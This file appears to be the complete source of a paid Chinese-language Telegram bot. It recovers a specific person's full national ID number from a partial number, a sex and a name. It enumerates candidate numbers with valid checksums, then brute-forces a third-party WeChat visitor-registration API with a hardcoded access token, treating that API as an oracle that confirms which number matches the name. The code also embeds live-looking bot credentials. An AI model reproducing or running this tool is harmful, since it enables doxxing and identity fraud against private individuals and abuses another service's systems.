import telebot 
import requests
import time
import re
import threading
import json
import os
import itertools
from datetime import datetime
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 1. 核心配置 =================
API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyNDkyNDYiLCJpYXQiOjE3Mzg1MDMxMTcsImV4cCI6MTczODY3NTkxN30.i9w1G8Y2mU5R5cCI6IkpXVCJ9" 

bot = telebot.TeleBot(API_TOKEN)
user_states = {}
generated_cache = {} 

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): float(v) for k, v in data.items()}
        except: pass
    tk = DEFAULT_TOKEN
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content: tk = content
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump({str(k): v for k, v in user_points.items()}, f)

def save_token(new_tk):
    with open(TOKEN_FILE, 'w', encoding='utf-8') as f:
        f.write(new_tk)

# --- 身份证校验码核心算法 ---
def get_id_check_code(id17):
    """根据身份证前17位计算第18位校验码"""
    if len(id17) != 17: return ""
    factors = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    rem_map = {0: '1', 1: '0', 2: 'X', 3: '9', 4: '8', 5: '7', 6: '6', 7: '5', 8: '4', 9: '3', 10: '2'}
    try:
        sum_val = sum(int(id17[i]) * factors[i] for i in range(17))
        return rem_map[sum_val % 11]
    except: return ""

# ================= 2. 界面构建与逻辑 =================

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"),
               types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
    return markup

def get_ui_bar(done, total):
    percent = int(done / total * 100) if total > 0 else 0
    bar = "█" * int(16 * done // total) + "░" * (16 - int(16 * done // total))
    return f"⌛ 开始核验...\n[{bar}] {done}/{total} {percent}%"

# --- 核心核验任务 ---
def run_batch_task(chat_id, msg_id, name, id_list, uid):
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
    total, done = len(id_list), 0
    success_match, is_running, stop_signal = None, True, False

    def progress_monitor():
        nonlocal done, is_running
        while is_running:
            time.sleep(3)
            try: bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=get_ui_bar(done, total))
            except: pass

    threading.Thread(target=progress_monitor, daemon=True).start()

    def verify(id_no):
        nonlocal done, is_running, stop_signal, success_match
        if stop_signal: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5)
            if r.json().get("code") == 0:
                success_match = f"✅ 核验成功！\n\n{name} {id_no} 二要素核验一致✅"
                stop_signal, is_running = True, False
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(verify, id_list)

    is_running = False
    try: bot.delete_message(chat_id, msg_id)
    except: pass
    bot.send_message(chat_id, success_match if success_match else "❌ 核验完成，未发现匹配结果。")

# ================= 3. 指令处理 =================

@bot.message_handler(commands=['set_token'])
def set_token_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    msg = bot.reply_to(message, "🗝 **请输入新的 X-Token：**")
    bot.register_next_step_handler(msg, lambda m: [save_token(m.text.strip()), bot.send_message(m.chat.id, "✅ Token更新成功")])

@bot.message_handler(commands=['add'])
def add_points_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, tid, amt = message.text.split()
        user_points[int(tid)] = user_points.get(int(tid), 0.0) + float(amt)
        save_points()
        bot.reply_to(message, f"✅ 充值成功！当前余额: `{user_points[int(tid)]}`")
    except: bot.reply_to(message, "格式：`/add 用户ID 积分`")

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0.0)
    text = f"Welcome to use!\n\n用户 ID: `{uid}`\n当前余额: `{pts:.2f}积分`"
    bot.send_message(message.chat.id, text, parse_mode='Markdown', reply_markup=get_main_markup())

@bot.message_handler(commands=['pl'])
def pl_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 2.5: return bot.reply_to(message, "积分不足！")
    user_states[message.chat.id] = {'step': 'v_name'}
    bot.send_message(message.chat.id, "请输入姓名：")

@bot.message_handler(commands=['bq'])
def bq_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 0.5: return bot.reply_to(message, "积分不足！")
    user_states[message.chat.id] = {'step': 'g_card'}
    bot.send_message(message.chat.id, "请输入身份证号（未知用x）：")

@bot.message_handler(func=lambda m: True)
def handle_all(message):
    uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
    state = user_states.get(chat_id)
    if not state or text.startswith('/'): return

    # --- 批量核验：姓名 ---
    if state['step'] == 'v_name':
        user_states[chat_id].update({'step': 'v_ids', 'name': text})
        bot.send_message(chat_id, f"✅ 记录姓名：{text}\n请发送身份证列表：")
        
    # --- 批量核验：列表 ---
    elif state['step'] == 'v_ids':
        ids = [i for i in re.findall(r'\d{17}[\dXx]', text) if len(i)==18]
        if ids:
            user_points[uid] -= 2.5; save_points()
            msg = bot.send_message(chat_id, get_ui_bar(0, len(ids)))
            threading.Thread(target=run_batch_task, args=(chat_id, msg.message_id, state['name'], ids, uid)).start()
        del user_states[chat_id]

    # --- 身份证生成：号码 ---
    elif state['step'] == 'g_card':
        user_states[chat_id].update({'step': 'g_sex', 'card': text.lower()})
        bot.send_message(chat_id, "请输入性别 (男/女):")

    # --- 身份证生成：性别与算法核心 ---
    elif state['step'] == 'g_sex':
        user_points[uid] -= 0.5; save_points()
        raw_card = state['card']
        
        # 1. 前17位穷举逻辑
        base_17 = raw_card[:17]
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in base_17]
        
        # 性别位过滤（第17位）
        if text == "男": char_sets[16] = [c for c in char_sets[16] if int(c) % 2 != 0]
        else: char_sets[16] = [c for c in char_sets[16] if int(c) % 2 == 0]
        
        # 2. 生成组合并计算校验码
        valid_ids = []
        for res in itertools.product(*char_sets):
            s17 = "".join(res)
            check_code = get_id_check_code(s17) # 调用算法
            valid_ids.append(s17 + check_code)
        
        valid_ids = valid_ids[:5000]
        generated_cache[uid] = valid_ids
        
        with open("铭.txt", "w") as f: f.write("\n".join(valid_ids))
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("立即核验 (2.5积分)", callback_data="start_verify_flow"))
        bot.send_document(chat_id, open("铭.txt", "rb"), caption=f"✅ 生成成功！共 {len(valid_ids)} 个合法号码", reply_markup=markup)
        del user_states[chat_id]

    elif state['step'] == 'v_name_after_gen':
        if uid in generated_cache:
            user_points[uid] -= 2.5; save_points()
            msg = bot.send_message(chat_id, get_ui_bar(0, len(generated_cache[uid])))
            threading.Thread(target=run_batch_task, args=(chat_id, msg.message_id, text, generated_cache[uid], uid)).start()
        del user_states[chat_id]

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "start_verify_flow":
        bot.send_message(call.message.chat.id, "请输入姓名:")
        user_states[call.message.chat.id] = {'step': 'v_name_after_gen'}

if __name__ == '__main__':
    bot.infinity_polling()
